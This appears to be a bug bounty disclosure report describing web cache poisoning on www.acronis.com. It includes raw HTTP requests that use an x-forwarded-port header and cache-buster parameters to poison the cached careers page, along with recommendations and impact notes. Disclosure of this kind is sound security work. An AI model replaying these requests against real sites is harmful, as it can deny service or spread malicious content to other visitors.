## Original Report

## Summary
I found the problem of cache poisoning in www.acronis.com. A poisoned web cache can potentially be a devastating means of distributing numerous different attacks, exploiting vulnerabilities such as XSS, JavaScript injection, open redirection, and so on.

## Steps To Reproduce

1. Use x-forwarded-port to destroy the cache, repeat the request until www.acronis.com:0 appears in the response  
```
GET /zh-cn/careers/?yig1bt7ai4=1 HTTP/1.1
Host: www.acronis.com
Connection: close
sec-ch-ua: "Chromium";v="86", "\"Not\\A;Brand";v="99", "Google Chrome";v="86"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36 yig1bt7ai4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9, text/yig1bt7ai4
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.acronis.com/zh-cn/cloud/cyber-protect/
Accept-Encoding: gzip, deflate, yig1bt7ai4
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
x-forwarded-port: zwrtxqvas9lm4kzkia
Origin: https://yig1bt7ai4.com
```

2. Remove the parameters, x-forwarded-port, and origin in the request header. Then send the request, the cache has been polluted (due to the cache hit, it may take several more requests).  
```
GET /zh-cn/careers/ HTTP/1.1
Host: www.acronis.com
Connection: close
sec-ch-ua: "Chromium";v="86", "\"Not\\A;Brand";v="99", "Google Chrome";v="86"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36 yig1bt7ai4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9, text/yig1bt7ai4
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.acronis.com/zh-cn/cloud/cyber-protect/
Accept-Encoding: gzip, deflate, yig1bt7ai4
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
```

3.Other users visit the /zh-cn/careers/ page, and the result has been poisoned.
4.The currently discovered causes of cache poisoning:
  - url params (if there is reflected XSS on the server side, it will be very dangerous)
  - x-forwarded-port header
  - x-forwarded-url header

## Recommendations
Cache poisoning is caused by different requests hitting the same cache. Remove these influencing factors, or only cache requests with unchanged results.

## Impact

1. Launch a denial of service attack
2. If a page contains url parameters or request header reflection XSS, cache poisoning can easily spread the page containing malicious code to other people without the need to communicate with the victim
